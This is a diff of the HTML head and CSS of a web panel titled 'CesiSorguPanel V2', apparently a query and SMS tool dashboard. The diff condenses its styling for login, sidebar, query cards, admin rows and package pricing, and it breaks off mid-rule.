@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ CesiSorguPanel | ULTRA PREMIUM</title>
+    <title>⚡ CesiSorguPanel V2 | Ultra Secure</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>
     <style>
         :root {
             --primary: #6c5ce7;
@@ -20,17 +19,10 @@
             --bg-card: rgba(20, 25, 45, 0.7);
             --glass: rgba(255, 255, 255, 0.05);
             --border: rgba(255, 255, 255, 0.1);
-            --neon-purple: 0 0 20px rgba(108, 92, 231, 0.5);
-            --neon-cyan: 0 0 20px rgba(0, 206, 201, 0.5);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
         body {
             background: radial-gradient(circle at 10% 20%, #0f1629 0%, #030617 50%, #0a0f1f 100%);
             min-height: 100vh;
@@ -38,1115 +30,176 @@
             overflow-x: hidden;
         }
 
-        /* Animated Background */
         .bg-animation {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
+            top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden;
         }
-
         .bg-animation::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(108, 92, 231, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(163, 99, 217, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(0, 206, 201, 0.1) 0%, transparent 40%);
+            top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle at 20% 80%, rgba(108, 92, 231, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(163, 99, 217, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 40%, rgba(0, 206, 201, 0.1) 0%, transparent 40%);
             animation: bgRotate 30s linear infinite;
         }
+        @keyframes bgRotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        @keyframes bgRotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Auth Container */
         .auth-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 2rem;
-            position: relative;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 2rem;
         }
-
+        
         .glass-card {
             background: var(--bg-card);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             border-radius: 2rem;
             border: 1px solid var(--border);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), var(--neon-purple);
-            padding: 2.5rem;
-            width: 100%;
-            max-width: 480px;
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 20px rgba(108, 92, 231, 0.3);
+            padding: 2.5rem; width: 100%; max-width: 480px; position: relative; overflow: hidden;
             animation: slideUp 0.6s ease-out;
         }
-
-        .glass-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            transition: 0.5s;
-        }
-
-        .glass-card:hover::before {
-            left: 100%;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .logo-area {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .logo-area i {
-            font-size: 3rem;
-            background: linear-gradient(135deg, #fff, #a363d9, #6c5ce7);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .logo-area h1 {
-            font-size: 1.8rem;
-            font-weight: 800;
-            margin-top: 0.5rem;
-            background: linear-gradient(135deg, #fff 0%, #a363d9 50%, #6c5ce7 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            letter-spacing: -0.5px;
-        }
-
-        .input-group {
-            margin-bottom: 1.2rem;
-            position: relative;
-        }
-
-        .input-group i {
-            position: absolute;
-            left: 1rem;
-            top: 50%;
-            transform: translateY(-50%);
-            color: rgba(255,255,255,0.5);
-            transition: 0.3s;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 1rem 1rem 1rem 2.8rem;
-            background: rgba(0,0,0,0.4);
-            border: 1px solid rgba(255,255,255,0.15);
-            border-radius: 1rem;
-            color: white;
-            font-size: 0.95rem;
-            transition: all 0.3s;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
-        }
-
-        .input-group input:focus + i {
-            color: var(--primary);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 1rem;
-            border: none;
-            border-radius: 1rem;
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(108, 92, 231, 0.6);
-        }
-
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            color: white;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.2);
-        }
-
-        .divider {
-            margin: 1.5rem 0;
-            text-align: center;
-            position: relative;
-            opacity: 0.5;
-        }
-
-        .divider::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
-        }
-
-        .divider span {
-            background: var(--bg-card);
-            padding: 0 1rem;
-            position: relative;
-            font-size: 0.85rem;
-        }
-
-        .error-message {
-            background: linear-gradient(90deg, rgba(255,71,87,0.8), rgba(255,71,87,0.4));
-            border: 1px solid rgba(255,71,87,0.5);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin-top: 1rem;
-            font-size: 0.9rem;
-            display: none;
-            animation: shake 0.5s;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-
-        /* Toast Notifications */
-        .toast-container {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .toast {
-            background: linear-gradient(90deg, rgba(46, 213, 115, 0.9), rgba(46, 213, 115, 0.7));
-            backdrop-filter: blur(10px);
-            padding: 1rem 1.5rem;
-            border-radius: 1rem;
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: slideInRight 0.4s ease, fadeOut 0.4s ease 2.6s;
-            min-width: 250px;
-            max-width: 350px;
-        }
-
-        .toast.error {
-            background: linear-gradient(90deg, rgba(255, 71, 87, 0.9), rgba(255, 71, 87, 0.7));
-        }
-
-        .toast.warning {
-            background: linear-gradient(90deg, rgba(255, 165, 2, 0.9), rgba(255, 165, 2, 0.7));
-        }
-
-        @keyframes slideInRight {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-
-        @keyframes fadeOut {
-            to { opacity: 0; transform: translateX(100%); }
-        }
-
-        /* App Layout */
-        .app-container {
-            display: flex;
-            min-height: 100vh;
-        }
-
-        .sidebar {
-            width: 300px;
-            background: rgba(10, 12, 25, 0.95);
-            backdrop-filter: blur(20px);
-            border-right: 1px solid var(--border);
-            padding: 1.5rem;
-            position: fixed;
-            height: 100vh;
-            overflow-y: auto;
-            z-index: 100;
-            transition: transform 0.3s;
-        }
-
-        .sidebar-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 1.4rem;
-            font-weight: 800;
-            margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .sidebar-header i {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-size: 1.6rem;
-        }
-
-        .user-stats {
-            background: var(--glass);
-            border-radius: 1.5rem;
-            padding: 1.2rem;
-            margin-bottom: 2rem;
-            border: 1px solid var(--border);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .user-stats::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
-        }
-
-        .stat-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0.6rem 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.9rem;
-        }
-
-        .stat-row:last-child {
-            border-bottom: none;
-        }
-
-        .stat-row i {
-            width: 24px;
-            color: var(--accent);
-        }
-
-        .stat-value {
-            font-weight: 700;
-            color: white;
-        }
-
-        .stat-value.premium {
-            background: linear-gradient(135deg, #ffd700, #ffed4e);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            animation: glow 2s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.5)); }
-            to { filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8)); }
-        }
-
-        .nav-tabs {
-            list-style: none;
-        }
-
-        .nav-tabs li {
-            margin-bottom: 0.5rem;
-        }
-
-        .tab-link {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 1rem;
-            border-radius: 1rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            color: #8892b0;
-            font-weight: 500;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .tab-link::before {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 0;
-            bottom: 0;
-            width: 0;
-            background: linear-gradient(90deg, var(--primary), transparent);
-            transition: width 0.3s;
-            opacity: 0.3;
-        }
-
-        .tab-link:hover, .tab-link.active {
-            background: rgba(108, 92, 231, 0.15);
-            color: white;
-            transform: translateX(5px);
-        }
-
-        .tab-link.active::before {
-            width: 100%;
-        }
-
-        .tab-link i {
-            width: 24px;
-            text-align: center;
-        }
-
-        .logout-btn {
-            margin-top: 2rem;
-            background: rgba(255, 71, 87, 0.2) !important;
-            border: 1px solid rgba(255, 71, 87, 0.5) !important;
-            color: #ff4757 !important;
-        }
-
-        .logout-btn:hover {
-            background: rgba(255, 71, 87, 0.3) !important;
-        }
-
-        .main-content {
-            margin-left: 300px;
-            flex: 1;
-            padding: 2rem;
-            min-height: 100vh;
-        }
-
-        .content-header {
-            margin-bottom: 2rem;
-        }
-
-        .content-header h2 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .content-header p {
-            color: #8892b0;
-        }
-
-        /* Cards & Grid */
-        .query-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
-            gap: 1.5rem;
-        }
-
-        .query-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(10px);
-            border-radius: 1.5rem;
-            padding: 1.5rem;
-            border: 1px solid var(--border);
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .query-card::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            transform: scaleX(0);
-            transition: transform 0.3s;
-        }
-
-        .query-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3), var(--neon-purple);
-            border-color: rgba(108, 92, 231, 0.3);
-        }
-
-        .query-card:hover::after {
-            transform: scaleX(1);
-        }
-
-        .query-card.sms-tool::after {
-            background: linear-gradient(90deg, var(--warning), #ff6348);
-        }
-
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1rem;
-        }
-
-        .card-title {
-            font-weight: 700;
-            font-size: 1.1rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .badge {
-            padding: 0.3rem 0.8rem;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-
-        .badge-sms {
-            background: rgba(255, 165, 2, 0.2);
-            color: #ffa502;
-            border: 1px solid rgba(255, 165, 2, 0.3);
-        }
-
-        .badge-query {
-            background: rgba(108, 92, 231, 0.2);
-            color: #a29bfe;
-            border: 1px solid rgba(108, 92, 231, 0.3);
-        }
-
-        .fav-btn {
-            background: none;
-            border: none;
-            color: rgba(255,255,255,0.3);
-            cursor: pointer;
-            font-size: 1.2rem;
-            transition: all 0.3s;
-            padding: 0.5rem;
-        }
-
-        .fav-btn:hover, .fav-btn.active {
-            color: #ffd700;
-            transform: scale(1.2);
-        }
-
-        .tool-input {
-            width: 100%;
-            padding: 0.8rem 1rem;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 0.8rem;
-            color: white;
-            margin-bottom: 0.8rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
-            transition: all 0.3s;
-        }
-
-        .tool-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.1);
-        }
-
-        .query-btn {
-            width: 100%;
-            padding: 0.8rem;
-            background: linear-gradient(135deg, rgba(108, 92, 231, 0.8), rgba(163, 99, 217, 0.8));
-            border: none;
-            border-radius: 0.8rem;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .query-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
-        }
-
-        .query-btn:active {
-            transform: translateY(0);
-        }
-
-        .query-result {
-            background: rgba(0,0,0,0.5);
-            margin-top: 1rem;
-            border-radius: 0.8rem;
-            padding: 1rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            max-height: 250px;
-            overflow: auto;
-            border: 1px solid rgba(255,255,255,0.05);
-            display: none;
-        }
-
-        .query-result.show {
-            display: block;
-            animation: fadeIn 0.3s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .query-result pre {
-            white-space: pre-wrap;
-            word-break: break-word;
-            color: #a8b2d1;
-        }
-
-        /* Admin Panel */
-        .admin-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(10px);
-            border-radius: 1.5rem;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-            border: 1px solid var(--border);
-        }
-
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1.5rem;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-
-        .user-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem;
-            background: rgba(255,255,255,0.03);
-            border-radius: 1rem;
-            margin-bottom: 0.8rem;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: all 0.3s;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-
-        .user-row:hover {
-            background: rgba(255,255,255,0.06);
-            transform: translateX(5px);
-        }
-
-        .user-info {
-            flex: 1;
-            min-width: 200px;
-        }
-
-        .user-name {
-            font-weight: 600;
-            color: white;
-            margin-bottom: 0.2rem;
-        }
-
-        .user-email {
-            font-size: 0.85rem;
-            color: #8892b0;
-        }
-
-        .user-stats-row {
-            display: flex;
-            gap: 1.5rem;
-            font-size: 0.9rem;
-        }
-
-        .stat-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .admin-actions {
-            display: flex;
-            gap: 0.5rem;
-            flex-wrap: wrap;
-        }
-
-        .small-btn {
-            padding: 0.5rem 1rem;
-            border: none;
-            border-radius: 0.6rem;
-            font-size: 0.85rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .small-btn:hover {
-            background: rgba(255,255,255,0.2);
-            transform: translateY(-2px);
-        }
-
+        
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .logo-area { text-align: center; margin-bottom: 2rem; }
+        .logo-area i { font-size: 3rem; background: linear-gradient(135deg, #fff, #a363d9, #6c5ce7); -webkit-background-clip: text; background-clip: text; color: transparent; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .logo-area h1 { font-size: 1.8rem; font-weight: 800; margin-top: 0.5rem; background: linear-gradient(135deg, #fff 0%, #a363d9 50%, #6c5ce7 100%); -webkit-background-clip: text; background-clip: text; color: transparent; }
+
+        .input-group { margin-bottom: 1.2rem; position: relative; }
+        .input-group i { position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.5); }
+        .input-group input { width: 100%; padding: 1rem 1rem 1rem 2.8rem; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.15); border-radius: 1rem; color: white; font-size: 0.95rem; transition: all 0.3s; outline: none; }
+        .input-group input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2); }
+        
+        .btn { width: 100%; padding: 1rem; border: none; border-radius: 1rem; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
+        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(108, 92, 231, 0.6); }
+        .btn-google { background: white; color: #333; margin-top: 0.5rem; }
+        .btn-google:hover { background: #f1f1f1; }
+        .btn-secondary { background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.2); }
+        
+        .divider { margin: 1.5rem 0; text-align: center; position: relative; opacity: 0.5; }
+        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent); }
+        .divider span { background: var(--bg-card); padding: 0 1rem; position: relative; font-size: 0.85rem; }
+
+        .error-message { background: linear-gradient(90deg, rgba(255,71,87,0.8), rgba(255,71,87,0.4)); border: 1px solid rgba(255,71,87,0.5); border-radius: 1rem; padding: 1rem; margin-top: 1rem; font-size: 0.9rem; display: none; animation: shake 0.5s; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
+
+        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: linear-gradient(90deg, rgba(46, 213, 115, 0.9), rgba(46, 213, 115, 0.7)); backdrop-filter: blur(10px); padding: 1rem 1.5rem; border-radius: 1rem; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; align-items: center; gap: 10px; animation: slideInRight 0.4s ease, fadeOut 0.4s ease 2.6s; min-width: 250px; }
+        .toast.error { background: linear-gradient(90deg, rgba(255, 71, 87, 0.9), rgba(255, 71, 87, 0.7)); }
+        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @keyframes fadeOut { to { opacity: 0; transform: translateX(100%); } }
+
+        .app-container { display: flex; min-height: 100vh; }
+        .sidebar { width: 300px; background: rgba(10, 12, 25, 0.95); backdrop-filter: blur(20px); border-right: 1px solid var(--border); padding: 1.5rem; position: fixed; height: 100vh; overflow-y: auto; z-index: 100; transition: transform 0.3s; }
+        .sidebar-header { display: flex; align-items: center; gap: 12px; font-size: 1.4rem; font-weight: 800; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+        .user-stats { background: var(--glass); border-radius: 1.5rem; padding: 1.2rem; margin-bottom: 2rem; border: 1px solid var(--border); position: relative; overflow: hidden; }
+        .user-stats::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent)); }
+        .stat-row { display: flex; align-items: center; justify-content: space-between; padding: 0.6rem 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.9rem; }
+        .stat-row:last-child { border-bottom: none; }
+        .stat-value { font-weight: 700; color: white; }
+        .stat-value.premium { background: linear-gradient(135deg, #ffd700, #ffed4e); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        
+        .nav-tabs { list-style: none; }
+        .nav-tabs li { margin-bottom: 0.5rem; }
+        .tab-link { display: flex; align-items: center; gap: 12px; padding: 1rem; border-radius: 1rem; cursor: pointer; transition: all 0.3s; color: #8892b0; font-weight: 500; }
+        .tab-link:hover, .tab-link.active { background: rgba(108, 92, 231, 0.15); color: white; transform: translateX(5px); }
+        .logout-btn { margin-top: 2rem; background: rgba(255, 71, 87, 0.2) !important; border: 1px solid rgba(255, 71, 87, 0.5) !important; color: #ff4757 !important; }
+        
+        .main-content { margin-left: 300px; flex: 1; padding: 2rem; min-height: 100vh; }
+        .content-header { margin-bottom: 2rem; }
+        .content-header h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 10px; }
+        
+        .query-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 1.5rem; }
+        .query-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 1.5rem; padding: 1.5rem; border: 1px solid var(--border); transition: all 0.3s; position: relative; overflow: hidden; }
+        .query-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--primary), var(--secondary)); transform: scaleX(0); transition: transform 0.3s; }
+        .query-card:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(0,0,0,0.3); border-color: rgba(108, 92, 231, 0.3); }
+        .query-card:hover::after { transform: scaleX(1); }
+        .query-card.sms-card::after { background: linear-gradient(90deg, var(--danger), var(--warning)); }
+        
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
+        .card-title { font-weight: 700; font-size: 1.1rem; display: flex; align-items: center; gap: 8px; }
+        .badge { padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
+        .badge-sms { background: rgba(255, 71, 87, 0.2); color: #ff4757; border: 1px solid rgba(255, 71, 87, 0.3); animation: pulse 2s infinite; }
+        
+        .tool-input { width: 100%; padding: 0.8rem 1rem; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 0.8rem; color: white; margin-bottom: 0.8rem; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; }
+        .tool-input:focus { outline: none; border-color: var(--primary); }
+        
+        .query-btn { width: 100%; padding: 0.8rem; background: linear-gradient(135deg, rgba(108, 92, 231, 0.8), rgba(163, 99, 217, 0.8)); border: none; border-radius: 0.8rem; color: white; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .query-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4); }
+        .query-btn.sms-btn { background: linear-gradient(135deg, rgba(255, 71, 87, 0.8), rgba(255, 165, 2, 0.8)); }
+        .query-btn.sms-btn:hover { box-shadow: 0 5px 15px rgba(255, 71, 87, 0.5); }
+        
+        .query-result { background: rgba(0,0,0,0.5); margin-top: 1rem; border-radius: 0.8rem; padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; max-height: 250px; overflow: auto; border: 1px solid rgba(255,255,255,0.05); display: none; }
+        .query-result.show { display: block; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .admin-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 1.5rem; padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid var(--border); }
+        .user-row { display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: rgba(255,255,255,0.03); border-radius: 1rem; margin-bottom: 0.8rem; border: 1px solid rgba(255,255,255,0.05); flex-wrap: wrap; gap: 1rem; }
+        .small-btn { padding: 0.5rem 1rem; border: none; border-radius: 0.6rem; font-size: 0.85rem; cursor: pointer; transition: all 0.3s; background: rgba(255,255,255,0.1); color: white; }
+        .small-btn:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
         .small-btn.success { background: rgba(46, 213, 115, 0.2); color: var(--success); }
         .small-btn.danger { background: rgba(255, 71, 87, 0.2); color: var(--danger); }
-        .small-btn.warning { background: rgba(255, 165, 2, 0.2); color: var(--warning); }
-        .small-btn.primary { background: rgba(108, 92, 231, 0.2); color: #a29bfe; }
 
-        /* Package Cards */
-        .package-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 1.5rem;
-        }
+        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; margin-top: 1rem; overflow: hidden; display: none; }
+        .progress-bar.show { display: block; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--success), var(--accent)); width: 0%; transition: width 0.3s; }
 
-        .package-card {
-            background: linear-gradient(145deg, rgba(30, 42, 74, 0.8), rgba(15, 20, 42, 0.9));
-            border-radius: 1.5rem;
-            padding: 2rem 1.5rem;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 2px solid transparent;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .package-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            opacity: 0;
-            transition: opacity 0.3s;
-            z-index: -1;
-        }
-
-        .package-card:hover {
-            transform: translateY(-10px);
-            border-color: var(--primary);
-            box-shadow: var(--neon-purple);
-        }
-
-        .package-card:hover::before {
-            opacity: 0.1;
-        }
-
-        .package-icon {
-            font-size: 3rem;
-            margin-bottom: 1rem;
-            color: var(--accent);
-        }
-
-        .package-name {
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-
-        .package-price {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff, var(--accent));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 1rem;
-        }
-
-        .package-features {
-            list-style: none;
-            text-align: left;
-            margin: 1.5rem 0;
-            font-size: 0.9rem;
-            color: #8892b0;
-        }
-
-        .package-features li {
-            padding: 0.3rem 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .package-features i {
-            color: var(--success);
-        }
-
-        /* Modal */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .modal-content {
-            background: var(--bg-card);
-            backdrop-filter: blur(20px);
-            border-radius: 2rem;
-            border: 1px solid var(--border);
-            padding: 2rem;
-            max-width: 500px;
-            width: 90%;
-            transform: scale(0.9);
-            transition: transform 0.3s;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .modal-overlay.active .modal-content {
-            transform: scale(1);
-        }
-
-        .modal-header {
-            margin-bottom: 1.5rem;
-        }
-
-        .modal-header h3 {
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .payment-info {
-            background: rgba(0,0,0,0.3);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .payment-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .file-input-wrapper {
-            position: relative;
-            overflow: hidden;
-            display: inline-block;
-            width: 100%;
-            margin: 1rem 0;
-        }
-
-        .file-input-wrapper input[type=file] {
-            position: absolute;
